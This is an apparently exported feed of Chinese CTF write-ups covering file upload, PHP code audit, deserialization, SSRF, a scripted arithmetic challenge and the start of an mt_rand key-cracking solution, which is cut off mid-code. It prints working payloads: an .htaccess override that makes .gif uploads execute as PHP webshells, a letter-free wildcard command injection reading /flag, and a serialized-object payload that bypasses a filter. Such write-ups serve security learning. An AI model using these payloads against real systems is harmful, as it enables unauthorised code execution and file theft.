    <content type="html"><![CDATA[<h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png">     </p><p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p><p>这时候就应该找apache中的相关配置了    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png">      </p><p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png">        </p><p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p><pre><code>&lt;Files &quot;*.gif&quot;&gt;ForceType application/x-httpd-phpSetHandler application/x-httpd-phpphp_flag engine on&lt;/Files&gt;</code></pre><p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p><p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p><p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png">        </p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p><h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[A-Za-z0-9_$@]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fighting!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p>过滤了字母数字还有<code>_@$</code>    </p><p>试了下异或，不行；url取反也不行，就没招了…….      </p><p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p><p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png">    </p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p><h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png">       </p><p>停电了会发生什么    </p><p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p><p>扫到<code>.index.php.swp</code>       </p><p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">logger</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$logFile</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$initMsg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$exitMsg</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// initialise variables</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">initMsg</span><span class="token operator">=</span><span class="token double-quoted-string string">"#--session started--#\n"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exitMsg</span><span class="token operator">=</span><span class="token double-quoted-string string">"#--session end--#\n"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span> <span class="token operator">=</span>  <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$fd</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logFile</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"a+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">,</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is destruct"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">weblog</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$weblogfile</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token double-quoted-string string">"system('cat /flag')"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// self::waf($this->filepath);</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">logger</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">weblogfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[&lt;>*#'|?\n ]/"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$str</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"this is destruct"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[&lt;>*#'|?\n ]/"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$log_unser</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>昨天晚上因为14级大风停电了.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre></code></pre><p><code>readfile</code>  、 flag在<code>/flag</code>      </p><p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p><p>flag过滤了，双写即可绕过    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">logger</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$logFile</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$initMsg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$exitMsg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">weblog</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$weblogfile</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">weblog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png">      </p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'url'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/file|dict/i"</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>SSRF    </p><p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p><p>算了，环境也关了，附上<br><a href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p><p>还有一道GO语言的题…….完全不懂…..</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>wicctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>wicctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>StrongestMind</title>
    <link href="/2021/05/10/BUU85/"/>
    <url>/2021/05/10/BUU85/</url>
    
    <content type="html"><![CDATA[<h2 id="PY"><a href="#PY" class="headerlink" title="PY"></a>PY</h2><p>打开环境 </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/0d2f6b843629e1dc.png"></p><p>python脚本      </p><p>还不会写，研究下大佬的      </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requests<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">def</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment">#会话保持</span>    url <span class="token operator">=</span> <span class="token string">'http://ee15b87d-2094-4459-97e9-6c7d3f88800d.node3.buuoj.cn/'</span>    match <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"[0-9]+ [+|-] [0-9]+"</span><span class="token punctuation">)</span>  <span class="token comment">#正则匹配   +：匹配前面的表达式一次或多次</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1001</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token builtin">str</span> <span class="token operator">=</span> match<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>        <span class="token comment"># print(eval(str))</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>   <span class="token comment">#eval执行</span>        r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    count<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>python</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ezaudit</title>
    <link href="/2021/05/08/BUU84/"/>
    <url>/2021/05/08/BUU84/</url>
    
    <content type="html"><![CDATA[<h2 id="0"><a href="#0" class="headerlink" title="-0-)"></a>-0-)</h2><p><img src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/e304316d-4424-4850-b53e-7392e0c5c05e.png" alt="01.png">     </p><p>题目打开是这样，挺正经的，以为是什么漏洞，源码中也没有提示     </p><p>看一眼题目名<code>Ezaudit</code>简单的审计     </p><p>哦   </p><p><code>www.zip</code>  </p><p>果然   </p><p>下载下来是<code>index.php</code>     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Content-type:text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$Private_key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'Private_key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'*************'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token single-quoted-string string">'************'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">.</span><span class="token single-quoted-string string">';'</span><span class="token punctuation">;</span>         <span class="token variable">$link</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//genarate private_key</span>  <span class="token keyword">function</span> <span class="token function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span></code></pre></code></pre><p>首先要获取到<code>private_key</code>    </p><p>之前也做过一道<code>mt_rand</code>的题目，那一道是根据前几位得到<code>seed</code>      </p><p>这次用<code>public_key</code>得到<code>seed</code>这两个应该是同一个<code>seed</code>吧   </p><p>不过这次用之前的脚本转换时爆不出来     </p><p>找了一个新的脚本     </p><p>发现少了一位，我之前那道题是怎么做出来的！！！？？？   </p><p>PHP版：     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token single-quoted-string string">'KVQP0LdJKRaV3n9D'</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token single-quoted-string string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span 